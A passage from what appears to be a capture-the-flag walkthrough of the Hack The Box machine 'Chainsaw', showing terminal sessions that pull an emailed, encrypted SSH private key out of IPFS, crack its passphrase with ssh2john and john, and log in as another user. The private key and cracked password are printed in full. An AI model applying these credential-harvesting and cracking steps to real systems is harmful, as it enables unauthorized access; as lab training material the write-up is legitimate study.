<p>Take a look at the <a href="https://docs.ipfs.io/reference/api/cli/" target="_blank" rel="noopener">cli documentation</a>.<br>I used <code>ip refs local</code> to list the local references:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs refs local</span><br><span class="line">QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y</span><br><span class="line">QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx</span><br><span class="line">QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB</span><br><span class="line">QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn</span><br><span class="line">QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp</span><br><span class="line">QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn</span><br><span class="line">QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1</span><br><span class="line">QmWSLAHhiNVRMFMv4bnE7fqq9E74RtXTRm9E1QVo37GV9t</span><br><span class="line">QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq</span><br><span class="line">QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri</span><br><span class="line">QmdfTbBqBPQ7VNxZEYEj14VmRuZBkqFbiwReogJgS1zR1n</span><br><span class="line">QmfRZWFfaugHeY5gcgNDrnRkxhPT3epmHodryPYK3it6kk</span><br><span class="line">QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V</span><br><span class="line">QmejvEPop4D7YUadeGqYWmZxHhLc4JBUCzJJHWMzdcMe2y</span><br><span class="line">QmbkQxbErC7KSWzSQw2FC13LUm9Rbo2XjeFQZbcmdarpuz</span><br><span class="line">QmPpsT37SpTbZkAeMz7LXiJ8nQseBNziGBzpW1YtM67qx6</span><br><span class="line">QmXWS8VFBxJPsxhF8KEqN1VpZf52DPhLswcXpxEDzF5DWC</span><br><span class="line">QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp</span><br><span class="line">Qmb7oGTxge7amSArtJsGUAqswY8y1G7m5QNjV57Nj5sEHU</span><br><span class="line">QmS4ustL54uo8FzR9455qaxZwuMiUhyvMcX9Ba8nUH4uVv</span><br><span class="line">QmXymZCHdTHz5BA5ugv9MQTBtQAb6Vit4iFeEnuRj6Udrh</span><br><span class="line">QmUNLLsPACCz1vLxQVkXqqLX5R1X345qqfHbsf67hvA3Nn</span><br><span class="line">Qma6kDKzUzFioo62v4LZaNsrwmCojF9AqwLaQJubRFnsAa</span><br><span class="line">QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me</span><br><span class="line">QmXgqKTbzdh83pQtKFb19SpMCpDDcKR2ujqk3pKph9aCNF</span><br><span class="line">QmYn3NxLLYA6xU2XL1QJfCZec4B7MpFNxVVtDvqbiZCFG8</span><br><span class="line">QmWMuEvh2tGJ1DiNPPoN6rXme2jMYUixjxsC6QUji8mop8</span><br><span class="line">QmY5heUM5qgRubMDD1og9fhCPA6QdkMp3QCwd4s7gJsyE7</span><br><span class="line">QmQ5vhrL7uv6tuoN9KeVBwd4PwfQkXdVVmDLUZuTNxqgvm</span><br><span class="line">QmZMUdskS6vK8ycBiAffrYAE4wUDuWX9eK7kNgQqPCGbwF</span><br><span class="line">QmPC3ZbrMeZ8BpstpNseNV4fCRL4QDzUKrSv8EHkarbn7r</span><br><span class="line">QmPhk6cJkRcFfZCdYam4c9MKYjFG9V29LswUnbrFNhtk2S</span><br><span class="line">QmSyJKw6U6NaXupYqMLbEbpCdsaYR5qiNGRHjLKcmZV17r</span><br><span class="line">QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo</span><br><span class="line">QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS</span><br><span class="line">QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M</span><br><span class="line">QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB</span><br><span class="line">Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure>
<p>I used <code>ipfs ls</code> on every hash to list the contents, most of them were empty or useless except for this one which had some email messages:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs ls QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri</span><br><span class="line">QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml            </span><br><span class="line">QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml    </span><br><span class="line">QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml      </span><br><span class="line">QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml                             </span><br><span class="line">QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure>
<p>We’re interested in <code>bobby</code>‘s file so I used <code>ipfs get</code> to get it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">Saving file(s) to QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line"> 4.53 KiB &#x2F; 4.53 KiB  100.00% 0s</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ls -al</span><br><span class="line">total 112</span><br><span class="line">drwxr-x--- 8 administrator administrator  4096 Nov 22 19:50 .</span><br><span class="line">drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout</span><br><span class="line">-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv</span><br><span class="line">drwxrwxr-x 5 administrator administrator  4096 Nov 22 19:50 .ipfs</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2</span><br><span class="line">-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile</span><br><span class="line">-rw-r--r-- 1 administrator administrator  4629 Nov 22 19:50 QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF              </span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt</span><br><span class="line">-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf</span><br><span class="line">-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure>
<p>The email had his encrypted <code>ssh</code> key as an attachment:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">X-Pm-Origin: internal</span><br><span class="line">X-Pm-Content-Encryption: end-to-end</span><br><span class="line">Subject: Ubuntu Server Private RSA Key</span><br><span class="line">From: IT Department &lt;chainsaw_admin@protonmail.ch&gt;</span><br><span class="line">Date: Thu, 13 Dec 2018 19:28:54 +0000      </span><br><span class="line">Mime-Version: 1.0</span><br><span class="line">Content-Type: multipart&#x2F;mixed;boundary&#x3D;---------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">To: bobbyaxelrod600@protonmail.ch &lt;bobbyaxelrod600@protonmail.ch&gt;</span><br><span class="line">X-Attached: bobby.key.enc</span><br><span class="line">Message-Id: &lt;zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU&#x3D;@protonmail.ch&gt;</span><br><span class="line">Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500</span><br><span class="line">X-Original-To: bobbyaxelrod600@protonmail.ch</span><br><span class="line">Return-Path: &lt;chainsaw_admin@protonmail.ch&gt;</span><br><span class="line">Delivered-To: bobbyaxelrod600@protonmail.ch</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">Content-Type: multipart&#x2F;related;boundary&#x3D;---------------------ffced83f318ffbd54e80374f045d2451                        </span><br><span class="line">-----------------------ffced83f318ffbd54e80374f045d2451</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp</span><br><span class="line">cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM</span><br><span class="line">aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl</span><br><span class="line">IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs</span><br><span class="line">IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs</span><br><span class="line">eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo</span><br><span class="line">ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl</span><br><span class="line">YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg</span><br><span class="line">YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48</span><br><span class="line">YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g</span><br><span class="line">RGVwYXJ0bWVudDxicj48L2Rpdj4&#x3D;</span><br><span class="line">-----------------------ffced83f318ffbd54e80374f045d2451--</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">Content-Type: application&#x2F;octet-stream; filename&#x3D;&quot;bobby.key.enc&quot;; name&#x3D;&quot;bobby.key.enc&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line">Content-Disposition: attachment; filename&#x3D;&quot;bobby.key.enc&quot;; name&#x3D;&quot;bobby.key.enc&quot;</span><br><span class="line"></span><br><span class="line">LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF</span><br><span class="line">Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM</span><br><span class="line">RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0</span><br><span class="line">dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z</span><br><span class="line">MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr</span><br><span class="line">aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB</span><br><span class="line">azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz</span><br><span class="line">RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw</span><br><span class="line">bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2</span><br><span class="line">eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD</span><br><span class="line">M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240</span><br><span class="line">UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM</span><br><span class="line">TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn</span><br><span class="line">TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE</span><br><span class="line">L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB</span><br><span class="line">VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2</span><br><span class="line">RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5</span><br><span class="line">U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI</span><br><span class="line">N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq</span><br><span class="line">TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo</span><br><span class="line">VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj</span><br><span class="line">MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N</span><br><span class="line">MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F</span><br><span class="line">V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5</span><br><span class="line">OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy</span><br><span class="line">WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10</span><br><span class="line">b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3</span><br><span class="line">RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ</span><br><span class="line">NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW</span><br><span class="line">clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3</span><br><span class="line">PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0&#x3D;</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93--</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure>
<p>I copied it to my box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nano bobby.key.enc.b64</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# base64 -d bobby.key.enc.b64 &gt; bobby.key.enc</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# cat bobby.key.enc</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,53D881F299BA8503</span><br><span class="line"></span><br><span class="line">SeCNYw&#x2F;BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z&#x2F;zj+v1dCIdejuk</span><br><span class="line">7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN&#x2F;eSxD4AWLcz</span><br><span class="line">n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2&#x2F;eyxE63VcRzrxJCYl+hvSZ6</span><br><span class="line">fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m&#x2F;pqf3TmGAk9+wriqnkODFQ</span><br><span class="line">I+2I1cPb8JRhLSz3pyB3X&#x2F;uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi</span><br><span class="line">w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT</span><br><span class="line">inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2</span><br><span class="line">yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6</span><br><span class="line">G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj</span><br><span class="line">hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes</span><br><span class="line">q8NsAentbsD+xl4W6q5muLJQmj&#x2F;xQrrHacEZDGI8kWvZE1iFmVkD&#x2F;xBRnwoGZ5ht</span><br><span class="line">DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG</span><br><span class="line">jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ</span><br><span class="line">IZMsd2kTSGUxy9o&#x2F;xPKDkUw&#x2F;SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw</span><br><span class="line">TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1&#x2F;XDSF2D7ibf&#x2F;W1mAxL5UmEqO0</span><br><span class="line">hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi</span><br><span class="line">4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et</span><br><span class="line">SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b&#x2F;eqzhKbkpnblmiK1f3reOM2YUKy8aaleh</span><br><span class="line">nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM</span><br><span class="line">ImnfontOYdwB6&#x2F;2oCuyJTif8Vw&#x2F;WtWqZNbpey9704a9map&#x2F;+bDqeQQ41+B8ACDbK</span><br><span class="line">WovsgyWi&#x2F;UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR</span><br><span class="line">gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr&#x2F;Jn+5ZfG02moF&#x2F;</span><br><span class="line">edL1bp9HPRI47DyvLwzT1&#x2F;5L9Zz6Y+1MzendTi3KrzQ&#x2F;Ycfr5YARvYyMLbLjMEtP</span><br><span class="line">UvJiY40u2nmVb6Qqpiy2zr&#x2F;aMlhpupZPk&#x2F;xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX</span><br><span class="line">15U210BdxEFUDcixNiwTpoBS6MfxCOZwN&#x2F;1Zv0mE8ECI+44LcqVt3w&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>I used <code>ssh2john.py</code> to get the hash of the key in <code>john</code> format then I used <code>john</code> with <code>rockyou.txt</code> to crack it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# &#x2F;opt&#x2F;ssh2john.py .&#x2F;bobby.key.enc &gt; bobby.key.enc.hash</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt .&#x2F;bobby.key.enc.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])</span><br><span class="line">Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 1 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 for all loaded hashes</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">jackychain       (.&#x2F;bobby.key.enc)</span><br><span class="line">1g 0:00:00:22 DONE (2019-11-22 21:56) 0.04380g&#x2F;s 628195p&#x2F;s 628195c&#x2F;s 628195C&#x2F;s *7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>Password: <code>jackychain</code>, let’s <code>ssh</code> into the box as <code>bobby</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# chmod 600 bobby.key.enc</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ssh -i bobby.key.enc bobby@chainsaw.htb </span><br><span class="line">Enter passphrase for key &#39;bobby.key.enc&#39;: </span><br><span class="line">bobby@chainsaw:~$ whoami</span><br><span class="line">bobby</span><br><span class="line">bobby@chainsaw:~$ id</span><br><span class="line">uid&#x3D;1000(bobby) gid&#x3D;1000(bobby) 